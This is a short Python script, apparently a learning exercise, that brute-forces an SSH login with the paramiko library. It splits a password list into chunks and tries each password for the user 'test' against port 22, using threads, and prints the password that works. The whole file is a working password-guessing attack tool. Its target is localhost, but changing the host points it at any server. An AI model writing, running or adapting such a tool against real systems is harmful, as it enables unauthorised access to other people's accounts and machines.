import numpy, paramiko, threading, time, sys

with open('passwords.txt', 'r') as file:
    passwords= file.read().split('\n')
    passwords1, passwords2, passwords3, passwords4 = numpy.array_split(passwords, 4)
    print(passwords1, passwords2, passwords3, passwords4)    



client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())



def bruteforce():
    hostname= '127.0.0.1'
    port= 22
    user= 'test'
    for passwd in passwords1:
        try:
            client.connect(hostname, port= port, username= user, password=passwd)
            session = client.get_transport().open_session()
            # print(session.active)
            # print(password)
            if session.active == 1:
                print(passwd)
                return passwd
            # sys.exit()
        except:
            print('Login Attempt Has Failed')
        time.sleep(0.1)



def bruteforce2():
    hostname= '127.0.0.1'
    port= 22
    user= 'test'
    for passwd in passwords2:
        try:
            client.connect(hostname, port= port, username= user, password=passwd)
            session = client.get_transport().open_session()
            # print(session.active)
            # print(password)
            if session.active == 1:
                print(passwd)
                return passwd
            # sys.exit()
        except:
            print('Login Attempt Has Failed')
        time.sleep(0.1)

if __name__ == "__main__":
    # bruteforce(passwords1)

    task1 = threading.Thread(target=bruteforce)
    # task2 = threading.Thread(target=bruteforce2)
    # task3 = threading.Thread(target=bruteforce, args= (passwords3, ))
    # task4 = threading.Thread(target=bruteforce, args= (passwords4, ))

    task1.start()
    # task2.start()
    # task3.start()
    # task4.start()

    task1.join()
    # task2.join()
    # task3.join()
    # task4.join()

    
